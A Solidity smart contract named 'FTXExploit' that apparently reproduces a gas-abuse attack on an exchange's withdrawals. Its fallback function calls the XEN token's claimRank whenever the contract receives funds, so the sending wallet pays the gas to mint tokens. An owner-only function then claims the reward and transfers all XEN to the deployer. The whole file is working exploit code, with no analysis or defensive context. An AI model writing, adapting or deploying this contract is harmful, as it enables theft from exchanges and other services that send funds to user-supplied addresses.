// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface Xen {
    function claimRank(uint256 term) external;
    function claimMintReward() external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}


contract FTXExploit {
    address private owner;

    constructor() {
        owner = msg.sender;
    }

    fallback() external payable {
        // call xen
        Xen xen = Xen(0x06450dEe7FD2Fb8E39061434BAbCFC05599a6Fb8);
        xen.claimRank(1);
    }

    function claimMintReward() public {
        require(msg.sender == owner, "not owner");
        Xen xen = Xen(0x06450dEe7FD2Fb8E39061434BAbCFC05599a6Fb8);
        xen.claimMintReward();

        // transfer XEN to owner
        xen.transfer(owner, xen.balanceOf(address(this)));
    }

}
